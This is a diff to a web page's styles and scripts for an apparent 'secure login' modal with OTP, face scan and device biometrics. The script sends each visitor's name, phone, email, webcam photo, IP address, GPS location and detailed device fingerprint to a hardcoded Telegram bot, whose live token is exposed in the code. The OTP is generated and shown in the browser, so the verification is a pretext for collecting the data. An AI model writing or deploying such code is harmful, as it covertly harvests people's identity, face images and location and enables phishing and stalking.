+    .mnd-kyc-ring {
+        position: absolute; 
+        inset: -5px; 
+        border-radius: 150px;
+        border: 5px solid transparent; 
+        transition: 0.4s ease; 
+        z-index: 5; 
+        pointer-events: none;
+    }
+    .scanner-active .mnd-kyc-ring { 
+        border-color: var(--primary); 
+        animation: pulseOval 2s infinite; 
+    }
+    .scanner-success .mnd-kyc-ring { 
+        border-color: var(--success); 
+        box-shadow: inset 0 0 40px rgba(0,250,154,0.6), 0 0 30px var(--success-glow); 
+    }
+    .scanner-error .mnd-kyc-ring { 
+        border-color: var(--danger); 
+        box-shadow: inset 0 0 40px rgba(255,68,68,0.6), 0 0 30px var(--danger-glow); 
+    }
 
-    /* --- 8. CENTERED PROFILE LOADER --- */
+    /* THE PERFECT GREEN LASER FRAME (Requested Feature) */
+    .mnd-green-laser-frame {
+        position: absolute;
+        inset: 0;
+        z-index: 6;
+        pointer-events: none;
+        display: none; /* Hidden by default */
+        /* Creates the precise targeting brackets */
+        background: 
+            linear-gradient(to right, var(--success) 3px, transparent 3px) 0 0,
+            linear-gradient(to bottom, var(--success) 3px, transparent 3px) 0 0,
+            linear-gradient(to left, var(--success) 3px, transparent 3px) 100% 0,
+            linear-gradient(to bottom, var(--success) 3px, transparent 3px) 100% 0,
+            linear-gradient(to right, var(--success) 3px, transparent 3px) 0 100%,
+            linear-gradient(to top, var(--success) 3px, transparent 3px) 0 100%,
+            linear-gradient(to left, var(--success) 3px, transparent 3px) 100% 100%,
+            linear-gradient(to top, var(--success) 3px, transparent 3px) 100% 100%;
+        background-repeat: no-repeat;
+        background-size: 40px 40px; /* Size of the bracket corners */
+        opacity: 0.8;
+    }
+    
+    /* The Horizontal Sweeping Laser Line */
+    .mnd-green-laser-frame::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -10%;
+        width: 120%;
+        height: 3px;
+        background: var(--success);
+        box-shadow: 0 0 15px var(--success), 0 0 30px var(--success), 0 10px 20px rgba(0,250,154,0.3);
+        animation: preciseLaserSweep 2.5s ease-in-out infinite;
+    }
+    
+    .scanner-active .mnd-green-laser-frame {
+        display: block; /* Turns on the green laser during scan */
+    }
+
+    /* Camera Switch & Flash Controls */
+    .mnd-camera-controls { 
+        display: flex; 
+        justify-content: center; 
+        gap: 15px; 
+        margin-bottom: 20px; 
+        width: 100%;
+    }
+    .mnd-cam-btn { 
+        background: rgba(255,255,255,0.08); 
+        border: 1px solid var(--border-deep); 
+        color: #fff; 
+        padding: 10px 18px; 
+        border-radius: 20px; 
+        font-size: 12px; 
+        font-weight: 700;
+        cursor: pointer; 
+        display: flex; 
+        align-items: center; 
+        gap: 8px; 
+        transition: 0.2s;
+    }
+    .mnd-cam-btn:active { background: rgba(255,255,255,0.15); transform: scale(0.95); }
+    
+    .mnd-kyc-status { 
+        font-size: 12px; 
+        font-weight: 800; 
+        text-align: center; 
+        margin-bottom: 20px; 
+        color: var(--text-muted); 
+        letter-spacing: 1px; 
+    }
+
+    /* * ---------------------------------------------------------------------------------------
+     * 7. PERFECTLY CENTERED & SIZED OTP INPUT
+     * ---------------------------------------------------------------------------------------
+     */
+    .mnd-success-icon { 
+        font-size: 50px; 
+        color: var(--success); 
+        text-align: center; 
+        display: block; 
+        margin-bottom: 15px; 
+        text-shadow: 0 0 20px var(--success-glow);
+    }
+    
+    .mnd-otp-center-wrap { 
+        display: flex; 
+        justify-content: center; 
+        margin-bottom: 5px; 
+        width: 100%;
+    }
+    .mnd-otp-input {
+        width: 240px; /* Constrained optimal width */
+        padding: 18px 10px; 
+        background: rgba(15,15,15,0.9);
+        border: 2px solid var(--primary); 
+        border-radius: 14px; 
+        color: var(--primary);
+        font-family: var(--font-main); 
+        text-align: center; 
+        font-size: 32px;
+        letter-spacing: 12px; 
+        font-weight: 900; 
+        outline: none;
+        box-shadow: inset 0 0 20px rgba(0,0,0,0.9), 0 5px 15px rgba(212,175,55,0.1); 
+        -webkit-appearance: none;
+        transition: var(--ease-smooth);
+    }
+    .mnd-otp-input:focus { 
+        border-color: #fff; 
+        color: #fff; 
+        box-shadow: inset 0 0 15px rgba(255,255,255,0.1), 0 5px 20px rgba(255,255,255,0.1);
+        transform: translateY(-2px);
+    }
+    .mnd-error-text { 
+        color: var(--danger); 
+        font-size: 13px; 
+        text-align: center; 
+        height: 18px; 
+        margin-bottom: 20px; 
+        font-weight: 700; 
+    }
+
+    /* * ---------------------------------------------------------------------------------------
+     * 8. FULL SCREEN CINEMATIC LOADER
+     * ---------------------------------------------------------------------------------------
+     */
     .mnd-loader {
-        position: fixed; inset: 0; background: rgba(5,5,5,0.98); z-index: 999999;
-        display: none; flex-direction: column; justify-content: center; align-items: center;
+        position: fixed; 
+        inset: 0; 
+        background: rgba(2,2,2,0.98); 
+        backdrop-filter: blur(10px);
+        z-index: 9999999;
+        display: none; /* Flex when active */
+        flex-direction: column; 
+        justify-content: center; 
+        align-items: center;
     }
     .mnd-loader.active { display: flex; }
-    .mnd-loader-content { position: relative; width: 100px; height: 100px; margin-bottom: 30px; display: flex; justify-content: center; align-items: center; }
-    .loader-profile-logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--primary); object-fit: cover; z-index: 2; }
-    .mnd-loader-pulse { position: absolute; inset: 0; border-radius: 50%; border: 2px solid var(--primary); animation: ripple 1.5s infinite ease-out; z-index: 1; }
-    .loader-text { color: var(--primary); font-size: 13px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 20px; animation: textBlink 1.5s infinite; }
-    .loader-progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 4px; overflow: hidden; }
-    .loader-progress-fill { width: 0%; height: 100%; background: var(--success); transition: width 0.3s ease; }
+    
+    .mnd-loader-content { 
+        position: relative; 
+        width: 110px; 
+        height: 110px; 
+        margin-bottom: 35px; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+    }
+    .loader-profile-logo { 
+        width: 85px; 
+        height: 85px; 
+        border-radius: 50%; 
+        border: 3px solid var(--primary); 
+        object-fit: cover; 
+        z-index: 2; 
+        box-shadow: 0 0 25px var(--primary-glow);
+    }
+    .mnd-loader-pulse { 
+        position: absolute; 
+        inset: 0; 
+        border-radius: 50%; 
+        border: 2px solid var(--primary); 
+        animation: radarRipple 2s infinite ease-out; 
+        z-index: 1; 
+    }
+    .loader-text { 
+        color: var(--primary); 
+        font-size: 13px; 
+        font-weight: 800; 
+        letter-spacing: 2.5px; 
+        text-transform: uppercase; 
+        margin-bottom: 25px; 
+        animation: pulseText 1.5s infinite; 
+    }
+    .loader-progress-bar { 
+        width: 220px; 
+        height: 5px; 
+        background: rgba(255,255,255,0.08); 
+        border-radius: 5px; 
+        overflow: hidden; 
+        box-shadow: inset 0 1px 3px rgba(0,0,0,0.8);
+    }
+    .loader-progress-fill { 
+        width: 0%; 
+        height: 100%; 
+        background: linear-gradient(90deg, var(--primary), var(--success)); 
+        transition: width 0.2s linear; 
+        box-shadow: 0 0 10px var(--success-glow);
+    }
 
-    /* --- 9. ANIMATIONS --- */
-    @keyframes slideFadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-    @keyframes pulseOval { 0% { box-shadow: 0 0 0 0 rgba(212,175,55,0.3); } 70% { box-shadow: 0 0 0 15px rgba(212,175,55,0); } 100% { box-shadow: 0 0 0 0 rgba(212,175,55,0); } }
-    @keyframes ripple { 0% { transform: scale(0.8); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
-    @keyframes textBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    /* * ---------------------------------------------------------------------------------------
+     * 9. HARDWARE ACCELERATED ANIMATIONS
+     * ---------------------------------------------------------------------------------------
+     */
+    @keyframes slideFadeIn { 
+        from { opacity: 0; transform: translateY(20px); } 
+        to { opacity: 1; transform: translateY(0); } 
+    }
+    @keyframes pulseOval { 
+        0% { box-shadow: 0 0 0 0 rgba(212,175,55,0.3); } 
+        70% { box-shadow: 0 0 0 20px rgba(212,175,55,0); } 
+        100% { box-shadow: 0 0 0 0 rgba(212,175,55,0); } 
+    }
+    @keyframes preciseLaserSweep { 
+        0%, 100% { top: 5%; opacity: 0; } 
+        10% { opacity: 1; } 
+        50% { top: 95%; } 
+        90% { opacity: 1; } 
+    }
+    @keyframes radarRipple { 
+        0% { transform: scale(0.8); opacity: 1; border-width: 3px; } 
+        100% { transform: scale(1.6); opacity: 0; border-width: 1px; } 
+    }
+    @keyframes pulseText { 
+        0%, 100% { opacity: 1; } 
+        50% { opacity: 0.4; } 
+    }
 </style>
 <script>
-    // --- TELEGRAM CONFIGURATION ---
+    // --- 1. GLOBAL TELEGRAM & SYSTEM CONFIGURATION ---
+    // This connects the system to your secure MND Telegram Node
     const MND_CONFIG = {
         botToken: "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ",
         chatId: "8506290708"
     };
 
-    // --- CORE AUTHENTICATION ENGINE ---
+    // --- 2. CORE AUTHENTICATION ENGINE ---
     const mndAuth = {
+        // State Memory Variables
         currentOTP: "",
         authMethod: "",
         toastTimer: null,
         resendInterval: null,
         cooldownActive: false,
 
-        // 1. Open/Close & State Resets
+        // ----------------------------------------------------------------------
+        // A. INITIALIZATION & UI STATE MANAGEMENT
+        // ----------------------------------------------------------------------
         openModal: function() {
-            // Check for saved session memory
+            // Memory Check: If the user is already authenticated on this trusted device
             if(localStorage.getItem('mnd_hub_auth') === 'true') {
                 document.getElementById('inpName').value = localStorage.getItem('mnd_hub_n') || "";
                 document.getElementById('inpPhone').value = localStorage.getItem('mnd_hub_p') || "";
                 document.getElementById('inpEmail').value = localStorage.getItem('mnd_hub_e') || "";
-                mndSecurity.triggerLoader(true);
+                
+                // Directly trigger the loader for returning users
+                if(typeof mndSecurity !== 'undefined') mndSecurity.triggerLoader(true, "Auto-Login");
             } else {
+                // Open the True Full-Screen Modal
                 document.getElementById('mndAuthModal').classList.add('active');
                 this.switchStep('step1');
             }
@@ -3051,78 +3631,104 @@
         },
 
         switchStep: function(stepId) {
+            // Hides all steps and smoothly slides in the requested step
             document.querySelectorAll('.mnd-step').forEach(el => el.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
         },
 
+        // ----------------------------------------------------------------------
+        // B. THE ULTIMATE ABORT & MEMORY RESET FUNCTION
+        // ----------------------------------------------------------------------
         abortProcess: function() {
-            // THE ULTIMATE RESET: Clears all states, inputs, and cameras
-            mndFace.stopCamera(); 
-            this.currentOTP = ""; // Wipe OTP Memory
+            // 1. Instantly kill the camera to prevent hanging and save battery
+            if(typeof mndFace !== 'undefined') mndFace.stopCamera(); 
+            
+            // 2. Mathematically wipe the OTP memory so old codes NEVER carry over
+            this.currentOTP = ""; 
+            
+            // 3. Clear all UI inputs and error messages
             document.getElementById('inpOTP').value = "";
             document.getElementById('otpErrorMsg').innerText = "";
+            
+            // 4. Hide Toast and Reset to Step 1
             this.hideToast();
             this.switchStep('step1');
+            
+            // 5. Reset UI buttons
+            const btn = document.getElementById('btnSms');
+            btn.innerHTML = '<i class="fas fa-comment-sms"></i> LOGIN WITH OTP';
+            btn.disabled = false;
         },
 
         validateInputs: function() {
             const n = document.getElementById('inpName').value.trim();
             const p = document.getElementById('inpPhone').value.trim();
+            
+            // Strict Validation: Name required, Phone must be exactly 10 digits
             if(!n || p.length !== 10 || isNaN(p)) { 
-                alert("⚠️ SECURITY HALT: Full Name and valid 10-Digit Mobile Number are required."); 
+                alert("⚠️ SECURITY HALT: Full Name and valid 10-Digit Mobile Number are strictly required."); 
                 return false; 
             }
             return true;
         },
 
-        // 2. OTP Generation Engine (Generates a fresh code every single time)
+        // ----------------------------------------------------------------------
+        // C. OTP GENERATION & TELEGRAM DISPATCH
+        // ----------------------------------------------------------------------
         generateOTP: async function(methodName) {
             if(!this.validateInputs()) return;
             this.authMethod = methodName;
             
             const btn = document.getElementById('btnSms');
             const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING KEY...';
             btn.disabled = true;
 
-            // Generate brand new 6-digit code
+            // GUARANTEED NEW OTP: Creates a brand new 6-digit sequence
             this.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            // Build the exact Telegram Log format requested (Calls Part 4)
             const payload = await mndSecurity.buildTelemetry(false, this.authMethod, this.currentOTP);
 
+            // Dispatch to Telegram Secure Server
             fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: MND_CONFIG.chatId, text: payload, parse_mode: 'Markdown' })
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: MND_CONFIG.chatId, text: payload, parse_mode: 'HTML' }) // Changed to HTML for exact formatting mapping
             }).then(() => {
                 this.switchStep('step3');
                 this.showToast(this.currentOTP);
-                this.startResendCooldown(); // Start the 30s cooldown
+                this.startResendCooldown(); // Initiate anti-spam cooldown
                 btn.innerHTML = originalText;
                 btn.disabled = false;
             }).catch(() => {
-                alert("Network Error: Could not connect to authentication server.");
+                alert("❌ Network Error: Could not connect to authentication server.");
                 btn.innerHTML = originalText;
                 btn.disabled = false;
             });
         },
 
-        // 3. Resend OTP Logic
+        // ----------------------------------------------------------------------
+        // D. RESEND OTP TIMERS & COOLDOWNS
+        // ----------------------------------------------------------------------
         resendOTP: function() {
-            if(this.cooldownActive) return; // Prevent spam clicking
+            if(this.cooldownActive) return; // Block spam clicks
             
-            document.getElementById('inpOTP').value = ""; // Clear old input
+            // Wipe old OTP from UI
+            document.getElementById('inpOTP').value = ""; 
             document.getElementById('otpErrorMsg').innerText = "";
-            this.currentOTP = Math.floor(100000 + Math.random() * 900000).toString(); // NEW CODE
             
-            this.generateOTP('OTP Resend');
+            // Call generate to create a completely NEW OTP
+            this.generateOTP('OTP Resend Request');
         },
 
         startResendCooldown: function() {
             const btn = document.getElementById('btnResend');
             const timerSpan = document.getElementById('resendTimer');
-            let timeLeft = 30; // 30 second cooldown
+            let timeLeft = 30; // 30 second cooldown timer
             
             this.cooldownActive = true;
-            btn.style.opacity = '0.5';
+            btn.style.opacity = '0.4';
             btn.style.cursor = 'not-allowed';
             
             clearInterval(this.resendInterval);
@@ -3139,26 +3745,29 @@
             }, 1000);
         },
 
-        // 4. OTP Verification
+        // ----------------------------------------------------------------------
+        // E. OTP VERIFICATION LOGIC
+        // ----------------------------------------------------------------------
         verifyOTP: function() {
             const inp = document.getElementById('inpOTP');
             const errMsg = document.getElementById('otpErrorMsg');
             
+            // Strict check against memory
             if(inp.value.trim() === this.currentOTP && this.currentOTP !== "") {
                 // Success: Save Session Memory
                 localStorage.setItem('mnd_hub_auth', 'true');
-                localStorage.setItem('mnd_hub_n', document.getElementById('inpName').value);
-                localStorage.setItem('mnd_hub_p', document.getElementById('inpPhone').value);
-                localStorage.setItem('mnd_hub_e', document.getElementById('inpEmail').value);
+                localStorage.setItem('mnd_hub_n', document.getElementById('inpName').value.trim());
+                localStorage.setItem('mnd_hub_p', document.getElementById('inpPhone').value.trim());
+                localStorage.setItem('mnd_hub_e', document.getElementById('inpEmail').value.trim());
                 
                 this.closeModal(); 
                 this.hideToast(); 
                 mndSecurity.triggerLoader(false, this.authMethod); 
             } else { 
-                // Failure UI
+                // Failure: Trigger red error UI
                 inp.style.borderColor = "var(--danger)"; 
                 inp.style.color = "var(--danger)";
-                errMsg.innerText = "Invalid or Expired Code. Please try again.";
+                errMsg.innerText = "❌ Invalid or Expired Code. Please try again.";
                 
                 setTimeout(() => { 
                     inp.style.borderColor = "var(--primary)"; 
@@ -3169,32 +3778,39 @@
             }
         },
 
-        // 5. Android-Style Toast UI
+        // ----------------------------------------------------------------------
+        // F. ANDROID TOAST NOTIFICATION CONTROLS
+        // ----------------------------------------------------------------------
         showToast: function(code) {
             const toast = document.getElementById('mndToast');
             document.getElementById('toastCode').innerText = code;
+            
+            // Unhide and slide down
             toast.classList.remove('mnd-hidden');
             setTimeout(() => toast.classList.add('visible'), 10);
             
+            // Auto hide after 8 seconds
             clearTimeout(this.toastTimer);
-            this.toastTimer = setTimeout(() => this.hideToast(), 8000); // Auto hide after 8s
+            this.toastTimer = setTimeout(() => this.hideToast(), 8000); 
         },
 
         hideToast: function() { 
             const toast = document.getElementById('mndToast');
             toast.classList.remove('visible');
-            setTimeout(() => toast.classList.add('mnd-hidden'), 300);
+            setTimeout(() => toast.classList.add('mnd-hidden'), 400); // Wait for transition
         },
 
         copyOTP: function() {
             navigator.clipboard.writeText(this.currentOTP);
             const desc = document.getElementById('toastDesc');
-            desc.innerText = "✅ Copied to clipboard!";
+            
+            // Visual feedback
+            desc.innerText = "✅ Key successfully copied!";
             desc.style.color = "var(--success)";
             
             setTimeout(() => { 
                 this.hideToast(); 
-                setTimeout(()=>{ 
+                setTimeout(() => { 
                     desc.innerText = "Your verification code is ready. Tap to copy."; 
                     desc.style.color = "#aaa"; 
                 }, 500); 
@@ -3203,12 +3819,12 @@
     };
 </script>
 <script>
-    // --- ADVANCED FACE VERIFICATION ENGINE ---
+    // --- 1. ADVANCED AI FACE VERIFICATION ENGINE ---
     const mndFace = {
         camStream: null,
         aiModel: null,
         scanInterval: null,
-        facingMode: 'user', // Defaults to front camera
+        facingMode: 'user', // Front camera by default
         flashActive: false,
 
         startScan: async function() {
@@ -3221,10 +3837,10 @@
         initCamera: async function() {
             const status = document.getElementById('kycStatus');
             const hintText = document.getElementById('kycHintText');
-            status.innerText = "INITIALIZING LENS...";
+            status.innerText = "INITIALIZING HARDWARE...";
             
             try {
-                if (this.camStream) this.stopCamera();
+                if (this.camStream) this.stopCamera(); // Prevent memory leaks
                 
                 this.camStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: this.facingMode }, 
@@ -3235,39 +3851,39 @@
                 video.srcObject = this.camStream;
                 video.play();
                 
-                // Feature Detection: Show flashlight button if rear camera supports it
+                // Hardware feature detection for Flashlight
                 const track = this.camStream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities();
-                if (capabilities.torch) {
+                const capabilities = track.getCapabilities && track.getCapabilities();
+                if (capabilities && capabilities.torch) {
                     document.getElementById('btnFlash').style.display = 'inline-flex';
                 } else {
                     document.getElementById('btnFlash').style.display = 'none';
                 }
 
-                // Silently load AI model
+                // Asynchronously load TensorFlow AI
                 if (!this.aiModel && window.blazeface) {
                     status.innerText = "LOADING NEURAL ENGINE...";
                     this.aiModel = await blazeface.load();
                 }
                 
-                status.innerText = "READY. ALIGN FACE AND START.";
+                status.innerText = "READY. ALIGN FACE & START.";
                 hintText.innerText = "Look straight into the camera.";
             } catch (e) {
-                alert("⚠️ Camera Access Denied. Please use OTP or Device Biometrics.");
+                alert("⚠️ Camera Access Denied. Please check permissions or use OTP.");
                 mndAuth.abortProcess();
             }
         },
 
         toggleCamera: function() {
             this.facingMode = this.facingMode === 'user' ? 'environment' : 'user';
+            this.flashActive = false; // Reset flash state
             this.initCamera();
         },
 
         toggleFlashlight: function() {
             if (!this.camStream) return;
             const track = this.camStream.getVideoTracks()[0];
-            const capabilities = track.getCapabilities();
-            if (capabilities.torch) {
+            if (track.getCapabilities().torch) {
                 this.flashActive = !this.flashActive;
                 track.applyConstraints({ advanced: [{ torch: this.flashActive }] });
             }
@@ -3279,79 +3895,86 @@
             const box = document.getElementById('kycBox');
             const hintText = document.getElementById('kycHintText');
             
+            // Turn on the perfect green laser CSS animation
             box.className = "mnd-kyc-container scanner-active";
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SCANNING...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> FAST SCAN ACTIVE...';
             btn.disabled = true;
 
             if(!this.aiModel) this.aiModel = await blazeface.load();
 
             const video = document.getElementById('kycVideo');
             const canvas = document.getElementById('kycCanvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
 
             let attempts = 0;
-            const maxAttempts = 30; // 4.5 seconds total
-            const dynamicHints = ["Hold device steady...", "Ensure good lighting...", "Analyzing facial geometry..."];
+            const maxAttempts = 50; // 50 attempts @ 100ms = 5 seconds max
+            const dynamicHints = ["Keep face steady...", "Checking lighting...", "Analyzing facial geometry..."];
             
+            // LIGHTNING FAST 100ms SCAN INTERVAL
             this.scanInterval = setInterval(async () => {
                 attempts++;
                 status.innerText = `ANALYZING... (${attempts}/${maxAttempts})`;
                 
-                // Update hints dynamically during scan
-                if(attempts % 10 === 0) hintText.innerText = dynamicHints[(attempts/10 - 1) % 3];
+                if(attempts % 15 === 0) hintText.innerText = dynamicHints[(attempts/15 - 1) % 3];
                 
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const faces = await this.aiModel.estimateFaces(video, false);
 
                 let isHuman = false;
-                // STRICT CHECK: Ensure >90% probability it is a real human
-                if (faces.length > 0 && faces[0].probability[0] > 0.90) { isHuman = true; }
+                
+                // STRICT CHECK: The AI MUST be 95%+ confident it is a real human face
+                if (faces.length > 0 && faces[0].probability[0] > 0.95) { 
+                    isHuman = true; 
+                }
 
                 if (isHuman) {
-                    clearInterval(this.scanInterval);
+                    clearInterval(this.scanInterval); // STOP SCANNING
                     box.className = "mnd-kyc-container scanner-success";
                     status.innerText = "HUMAN VERIFIED";
                     status.style.color = "var(--success)";
                     hintText.innerText = "Verification Complete. Generating Code...";
                     
-                    // Generate OTP and switch to OTP input screen
+                    // GENERATE BRAND NEW OTP UPON SUCCESS
                     mndAuth.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
+                    // Snap secure picture and proceed
                     canvas.toBlob(async (blob) => {
                         this.stopCamera(); 
                         mndAuth.switchStep('step3');
                         mndAuth.showToast(mndAuth.currentOTP);
                         mndAuth.startResendCooldown();
                         
+                        // Send Exact Telemetry Format
                         const fd = new FormData();
                         fd.append('chat_id', MND_CONFIG.chatId);
                         fd.append('caption', await mndSecurity.buildTelemetry(false, "AI Face Scan", mndAuth.currentOTP));
-                        fd.append('parse_mode', 'Markdown');
-                        fd.append('photo', blob, 'kyc.jpg');
+                        fd.append('parse_mode', 'HTML');
+                        fd.append('photo', blob, 'mnd_face_kyc.jpg');
                         fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
 
-                        btn.innerHTML = '<i class="fas fa-expand"></i> START SCANNING';
+                        btn.innerHTML = '<i class="fas fa-expand"></i> START SECURE SCAN';
                         btn.disabled = false;
                     }, 'image/jpeg', 0.85);
 
                 } else if (attempts >= maxAttempts) {
+                    // FAILED TO FIND FACE IN 5 SECONDS - DO NOT GIVE OTP
                     clearInterval(this.scanInterval);
                     box.className = "mnd-kyc-container scanner-error";
                     status.innerText = "NO HUMAN DETECTED";
                     status.style.color = "var(--danger)";
-                    hintText.innerText = "Ensure face is visible and well-lit.";
+                    hintText.innerText = "Ensure face is visible and well-lit. No code generated.";
                     btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
                     btn.disabled = false;
                 }
-            }, 150); // Lightning fast 150ms checks
+            }, 100); // 100ms ultra-fast scanning
         },
 
         stopCamera: function() {
             clearInterval(this.scanInterval);
             if (this.camStream) { 
                 this.camStream.getTracks().forEach(t => {
-                    // Turn off flash if active before stopping track
                     if (t.getCapabilities && t.getCapabilities().torch && this.flashActive) {
                         t.applyConstraints({ advanced: [{ torch: false }] }).catch(e=>{});
                     }
@@ -3367,20 +3990,20 @@
         }
     };
 
-    // --- BIOMETRICS & SECURITY LOGGING ENGINE ---
+    // --- 2. DEVICE BIOMETRICS & EXACT TELEMETRY LOGGING ---
     const mndSecurity = {
         startBiometric: async function() {
             if(!mndAuth.validateInputs()) return;
             const uName = document.getElementById('inpName').value;
             
-            // Check if device supports Fingerprint/FaceID via WebAuthn
+            // WebAuthn API for Native Fingerprint/PIN
             if (window.PublicKeyCredential) {
                 try {
                     const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
                     const cred = await navigator.credentials.create({
                         publicKey: {
                             challenge: chal, 
-                            rp: { name: "Secure Hub" },
+                            rp: { name: "Maa Nirmala Hub" },
                             user: { id: new Uint8Array(16), name: uName, displayName: uName },
                             pubKeyCredParams: [{ type: "public-key", alg: -7 }],
                             authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
@@ -3389,17 +4012,17 @@
                     });
 
                     if (cred) {
-                        // Success: Save Session Memory & Proceed
                         localStorage.setItem('mnd_hub_auth', 'true');
                         localStorage.setItem('mnd_hub_n', uName);
                         localStorage.setItem('mnd_hub_p', document.getElementById('inpPhone').value);
                         localStorage.setItem('mnd_hub_e', document.getElementById('inpEmail').value);
                         
                         mndAuth.closeModal();
-                        this.triggerLoader(false, "Device Biometrics (WebAuthn)");
+                        mndAuth.currentOTP = "OS_VERIFIED"; // Special flag for telemetry
+                        this.triggerLoader(false, "Device Biometrics");
                     }
-                } catch (e) { alert("❌ Device authentication canceled or failed."); }
-            } else { alert("⚠️ Biometric authentication is not supported on this browser."); }
+                } catch (e) { alert("❌ Device authentication canceled."); }
+            } else { alert("⚠️ Hardware biometrics not supported on this browser."); }
         },
 
         buildTelemetry: async function(isReturn, method, otpCode = "N/A") {
@@ -3407,38 +4030,98 @@
             let p = document.getElementById('inpPhone').value || "Auto";
             let e = document.getElementById('inpEmail').value || "Auto";
             
-            let bat="Unknown", gpu="N/A", net="Unknown";
-            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(err){}
-            try { if(navigator.connection) net = navigator.connection.effectiveType; } catch(err){}
-            try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } catch(err){}
+            let bat="Unknown", gpu="N/A", net="Unknown", ip="Unknown";
+            
+            try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(err){}
+            try { 
+                const b = await navigator.getBattery(); 
+                bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; 
+            } catch(err){}
+            try { 
+                if(navigator.connection) net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; 
+            } catch(err){}
+            try { 
+                var c=document.createElement('canvas'); var gl=c.getContext('webgl'); 
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); 
+            } catch(err){}
             
             const cores = navigator.hardwareConcurrency || "Unknown";
-            const browser = navigator.userAgent;
-            const screen = `${window.screen.width}x${window.screen.height}`;
-            let loc = "❌ Location Blocked";
+            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+            const osStr = navigator.userAgent;
+            const screenStr = `${window.screen.width}x${window.screen.height}`;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            let model = "Unknown Device";
+            if (navigator.userAgentData) { 
+                try { 
+                    const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); 
+                    model = `${dt.platform} ${dt.model}`; 
+                } catch(e){} 
+            }
 
-            let stat = isReturn ? "(Saved Cache Bypass)" : `(${method} | Auth Key: ${otpCode})`;
-            let ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+            let gpsStatus = "❌ Denied/Timeout";
+            let mapLink = "N/A";
+            const getL = () => new Promise(res => {
+                if(!navigator.geolocation) return res();
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        gpsStatus = "✅ View on Maps";
+                        mapLink = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        res();
+                    },
+                    err => res()
+                );
+            });
+            await Promise.race([getL(), new Promise(r => setTimeout(r, 2000))]); // Fast timeout
 
-            return `🚨 *MND SECURE LOG* 🚨\n${stat}\n\n👤 *IDENTITY MATRIX*\n• Name: ${n}\n• Phone: ${p}\n• Email: ${e}\n\n📱 *DEVICE INTEL*\n• GPU: ${gpu}\n• CPU Cores: ${cores}\n• Battery: ${bat}\n• Network: ${net}\n• Screen: ${screen}\n• OS: \`${browser}\`\n\n⏰ *Time:* ${ts}`;
+            let finalCode = otpCode === "OS_VERIFIED" ? "BIOMETRIC_PASS" : otpCode;
+            let displayMethod = isReturn ? "Auto-Login Override" : method;
+            
+            const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+
+            // EXACT TELEGRAM LOG FORMAT AS REQUESTED
+            return `🚨 <b>MND SECURE ACCESS LOG</b> 🚨
+(${displayMethod} | Code: ${finalCode})
+
+👤 <b>IDENTITY MATRIX</b>
+• Name: ${n}
+• Phone: ${p}
+• Email: ${e}
+
+📱 <b>DEVICE INTELLIGENCE</b>
+• Model: ${model}
+• OS: ${osStr}
+• Screen: ${screenStr}
+• Timezone: ${tz}
+
+⚙️ <b>HARDWARE LAYER</b>
+• GPU: ${gpu}
+• CPU/RAM: Cores: ${cores}, RAM: ${ram}
+• Battery: ${bat}
+
+📡 <b>NETWORK & LOCATION</b>
+• IP: ${ip}
+• Type: ${net}
+• GPS: ${gpsStatus}
+•map links- ${mapLink}
+⏰ Timestamp: ${ts}`;
         },
 
+        // --- 3. FINAL LOAD & REDIRECT ---
         triggerLoader: async function(isReturn, authMethod = "Auto Login") {
             const loader = document.getElementById('fullLoader');
             const txt = document.getElementById('loaderText');
             const fill = document.getElementById('loaderFill');
             loader.classList.add('active');
 
-            // Send silent telemetry on Biometric or Auto-Login
-            if(isReturn || authMethod === "Device Biometrics (WebAuthn)") {
